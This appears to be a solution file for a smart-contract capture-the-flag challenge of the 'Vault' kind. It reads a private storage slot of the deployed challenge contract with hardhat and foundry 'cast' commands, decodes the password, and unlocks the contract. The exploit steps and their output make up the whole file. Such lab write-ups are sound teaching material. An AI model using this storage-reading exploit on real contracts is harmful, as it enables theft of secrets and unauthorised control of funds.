// This attack cannot be done in foundry because of the lack of getting storage at...
// Storage of another contract is not natively available within solidity

// Below is an example using hardhat...

/*
import { ethers } from "hardhat";

async function main() {
    const challengeContractAddress = "0x4c85954275cB0F16c19754b672e6592C9dD93d5d"
    const challengeContract = await ethers.getContractAt("Vault", challengeContractAddress)
    const password = await ethers.provider.getStorage(
        challengeContract.address(),
        1
      )
    console.log(password)
    // await challengeContract.unlock(password);
    // const res = challengeContract.locked();
    // console.log("Contract locked? ", res);
}


main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
  */

// However foundry comes built in with the "cast" tool that also has the ability to access contract storage slots
// > cast storage 0x4c85954275cB0F16c19754b672e6592C9dD93d5d 1 --rpc-url $RPC_URL
// >> 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
// > cast to-ascii 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
// >> A very strong secret password :)
// >cast send 0x4c85954275cB0F16c19754b672e6592C9dD93d5d "unlock(bytes32)" 0x412076657279207374726f6e67207365637265742070617373776f7264203a29 --rpc-url $RPC_URL --private-key $PKEY
// We can check the success of our unlock with the following:
// >cast call 0x4c85954275cB0F16c19754b672e6592C9dD93d5d "locked()(bool)"
// >> false
